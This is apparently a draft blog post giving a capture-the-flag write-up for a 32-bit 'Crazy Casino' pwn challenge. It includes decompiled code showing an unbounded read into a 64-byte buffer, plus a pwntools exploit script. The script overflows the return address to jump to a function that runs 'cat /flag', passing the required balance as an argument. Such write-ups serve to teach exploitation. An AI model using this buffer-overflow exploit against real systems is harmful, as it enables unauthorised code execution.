+++
date = '2025-12-24T13:51:06+02:00'
draft = true
title = 'Crazy_casino'
+++
# Crazy Casino
### category : pwn

You are down to your last 10 credits. The neon lights are blinding, the slot machines are rigged, and the house always wins. You've got your eyes on the VIP Lounge. That's where the real 'Whales' play—the high rollers with 1,000,000 credit balances. Rumor has it, the management keeps the Flag on a silver platter in there, right next to the complimentary shrimp cocktail.

we run the 32bit binary and it asks us for a name, i tried several inputs but to no avail nothing works so lets try reversing it, inside we find a function called entrance_desk

and when looking at the functions we find 
0x08049962  vip_lounge
lets check the disassembly
in  entrance_desk there is no limit on the input we can pass to the buffer 
so my idea is to overflow the return address and jump to vip_lounge

this is the decompiled result :
i used binary-ninja

```c
08049962    void vip_lounge(int32_t arg1) __noreturn

0804997e        _IO_puts("\n[!] VIP ENTRY SYSTEM DETECTED JUMP...")
08049990        _IO_puts("[*] Verifying Account Balance...")
0804999d        __sleep(1)
0804999d        
080499ac        if (arg1 == 0xf4240)
080499b8            _IO_puts("###################################################")
080499ca            _IO_puts("#           VIP ACCESS GRANTED                    #")
080499dc            _IO_puts("###################################################")
080499ee            _IO_puts("[*] Balance Verified: 1,000,000 coins.")
08049a00            _IO_puts("[*] Please enjoy your complimentary flag:")
08049a12            __libc_system("cat /flag")
08049a1f            exit(0)
08049a1f            noreturn
08049a1f        
08049a2e        _IO_puts("###################################################")
08049a40        _IO_puts("#           ACCESS DENIED                         #")
08049a52        _IO_puts("###################################################")
08049a64        _IO_puts("[!] Error: Insufficient funds to enter this level.")
08049a76        _IO_puts("[!] Required: 1,000,000")
08049a81        int32_t var_18 = arg1
08049a8b        _IO_printf("[!] Received: %d\n")
08049a9d        _IO_puts("[!] Security Alert: Bouncer dispatched.")
08049aaa        exit(1)
08049aaa        noreturn


08049aaf    void* entrance_desk()

08049ac1        int32_t var_10 = 0xa
08049ad2        _IO_puts("\nWelcome to the desperate gambler's den.")
08049add        int32_t var_68 = var_10
08049ae7        _IO_printf("Your current balance: %d coins.\n")
08049af9        _IO_puts("Cost to enter VIP Lounge: 1,000,000 coins.")
08049b0b        _IO_puts("\n[!] ALERT: The slot machines are currently out of order.")
08049b1d        _IO_puts("    You cannot earn more coins today.")
08049b2f        _IO_printf("\nPlease sign the guestbook to leave (Enter Name): ")
08049b43        _IO_fflush(stdout)
08049b63        char inputbuffer[0x40]
08049b63        
08049b63        if (__libc_read(0, &inputbuffer, 0xc8) != 0)
08049b7b            inputbuffer[sub_8049070(&inputbuffer, 0x80b62f3)] = 0
08049b7b        
08049b86        char (* var_68_2)[0x40] = &inputbuffer
08049b8e        _IO_printf("\nGoodbye, %s\n")
08049bad        return _IO_puts("Come back when you're rich.")
```

lets overflow the return address and jump to the cat /flag function and get the flag
   0x08049a05 <+163>:	add    esp,0x10
we want to jump to this address
and to bypass the psuedo stack canary we use the follwing script

```python
from pwn import *

context.binary = ELF('./chal')
p = remote("crazy-casino.2025-bq.ctfcompetition.com", 1337)

p.recvuntil(b"Enter Name): ")

# 1. Padding (80 bytes)
offset = 80
padding = b"A" * offset

# 2. The VIP Lounge Address (Start of the function!)
#    From your dump: 08049962 void vip_lounge(int32_t arg1)
vip_lounge = p32(0x08049962)

# 3. Fake Return Address (4 bytes)
#    Required because the function expects [RET_ADDR] [ARG1] on the stack
fake_ret = b"AAAA"

# 4. The Argument (1,000,000)
#    0xf4240 is the hex value for 1 million
arg1 = p32(1000000)

# Build the stack
payload = padding + vip_lounge + fake_ret + arg1

print(f"Sending payload: {len(payload)} bytes")
p.sendline(payload)
p.interactive()
```